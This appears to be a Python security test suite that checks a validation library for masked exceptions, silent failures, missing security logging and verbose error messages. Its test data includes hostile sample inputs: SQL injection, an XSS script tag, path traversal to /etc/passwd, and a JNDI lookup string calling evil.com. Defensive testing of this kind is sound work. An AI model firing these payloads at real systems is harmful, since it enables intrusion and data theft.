"""
MAJOR-007: Simple Test Suite for Exception Handling Vulnerabilities

Demonstrates improper exception handling in validation module.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from reasoning_library.validation import validate_dict_schema, safe_divide, validate_confidence_value
from reasoning_library.exceptions import ValidationError
from reasoning_library.security_logging import get_security_logger


def test_broad_exception_handling():
    """Test broad exception catching in validate_dict_schema."""
    print("🧪 Testing broad exception handling in validate_dict_schema...")

    # Custom validator that raises an exception
    def security_validator(value):
        if "malicious" in str(value):
            raise RuntimeError("SECURITY: Potential attack detected!")
        return value

    # Test with malicious input
    malicious_data = {"input_field": "malicious_payload"}

    try:
        result = validate_dict_schema(
            malicious_data,
            "test_data",
            value_validators={"input_field": security_validator}
        )
        print("❌ ERROR: Should have raised ValidationError")
    except ValidationError as e:
        error_msg = str(e)
        print(f"✅ CONFIRMED: Security exception masked")
        print(f"   Original: 'SECURITY: Potential attack detected!'")
        print(f"   Masked to: '{error_msg}'")
        if "SECURITY" not in error_msg:
            print("   🔴 VULNERABILITY: Security context lost in broad exception handling")
        return True
    except Exception as e:
        print(f"❌ Unexpected exception: {type(e).__name__}: {e}")
        return False

    return False


def test_safe_divide_silent_failure():
    """Test silent failure in safe_divide."""
    print("\n🧪 Testing silent failure in safe_divide...")

    # Test with malicious input that should fail validation
    malicious_input = "'; DROP TABLE users; --"
    valid_denominator = 5

    result = safe_divide(malicious_input, valid_denominator)

    if result == 0.0:
        print(f"✅ CONFIRMED: Malicious input silently processed")
        print(f"   Input: '{malicious_input}'")
        print(f"   Result: {result} (default value)")
        print("   🔴 VULNERABILITY: Dangerous input processed without error or logging")
        return True
    else:
        print(f"❌ UNEXPECTED: Result was {result}, expected 0.0")
        return False


def test_missing_security_logging():
    """Test missing security logging for validation failures."""
    print("\n🧪 Testing missing security logging...")

    security_logger = get_security_logger()
    initial_metrics = security_logger.get_security_metrics()

    # Simulate multiple attack attempts
    attack_inputs = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
    ]

    security_events_before = initial_metrics["total_events"]

    for attack_input in attack_inputs:
        try:
            validate_confidence_value(attack_input)
        except ValidationError:
            pass  # Expected to fail, but should be logged

    final_metrics = security_logger.get_security_metrics()
    security_events_after = final_metrics["total_events"]

    if security_events_after == security_events_before:
        print(f"✅ CONFIRMED: {len(attack_inputs)} attack attempts not logged")
        print(f"   Events before: {security_events_before}")
        print(f"   Events after: {security_events_after}")
        print("   🔴 VULNERABILITY: Security monitoring bypassed")
        return True
    else:
        print(f"❌ UNEXPECTED: Security events increased from {security_events_before} to {security_events_after}")
        return False


def test_information_disclosure():
    """Test potential information disclosure."""
    print("\n🧪 Testing information disclosure in validation errors...")

    dangerous_inputs = [
        "NaN",
        "inf",
        "1e10",  # Scientific notation (blocked)
        "0xFF",  # Hexadecimal (blocked)
    ]

    vulnerabilities_found = []

    for dangerous_input in dangerous_inputs:
        try:
            validate_confidence_value(dangerous_input)
            print(f"❌ UNEXPECTED: Dangerous input accepted: {dangerous_input}")
        except ValidationError as e:
            error_msg = str(e)
            print(f"   Input: '{dangerous_input}' -> Error: '{error_msg}'")

            # Check if error reveals too much information
            if any(pattern in error_msg.lower() for pattern in ["pattern", "regex", "invalid format", "dangerous"]):
                vulnerabilities_found.append(f"Information disclosure for '{dangerous_input}': {error_msg}")

    if vulnerabilities_found:
        print(f"✅ CONFIRMED: {len(vulnerabilities_found)} potential information disclosure issues")
        for vuln in vulnerabilities_found:
            print(f"   🔴 {vuln}")
        return True
    else:
        print("✅ No obvious information disclosure found")
        return False


def main():
    """Run all vulnerability tests."""
    print("🔍 MAJOR-007: Exception Handling Vulnerability Assessment")
    print("=" * 60)

    vulnerabilities = []

    # Test each vulnerability type
    if test_broad_exception_handling():
        vulnerabilities.append("Broad exception handling masks security errors")

    if test_safe_divide_silent_failure():
        vulnerabilities.append("Silent failure allows dangerous operations")

    if test_missing_security_logging():
        vulnerabilities.append("Security logging bypass for validation failures")

    if test_information_disclosure():
        vulnerabilities.append("Information disclosure through error messages")

    # Summary
    print("\n" + "=" * 60)
    print("🚨 VULNERABILITY SUMMARY")
    print("=" * 60)

    if vulnerabilities:
        print(f"❌ Found {len(vulnerabilities)} critical vulnerabilities:")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"   {i}. {vuln}")

        print(f"\n📝 IMPACT: These vulnerabilities allow:")
        print("   • Attack attempts to be masked and ignored")
        print("   • Security monitoring to be bypassed")
        print("   • Dangerous operations to continue silently")
        print("   • Internal security mechanisms to be exposed")

        print(f"\n🔧 REMEDIATION REQUIRED:")
        print("   • Replace broad exception handling with specific exception types")
        print("   • Add security logging for all validation failures")
        print("   • Implement proper error propagation for security events")
        print("   • Sanitize error messages to prevent information disclosure")

        return 1
    else:
        print("✅ No vulnerabilities detected")
        return 0


if __name__ == "__main__":
    exit_code = main()
    sys.exit(exit_code)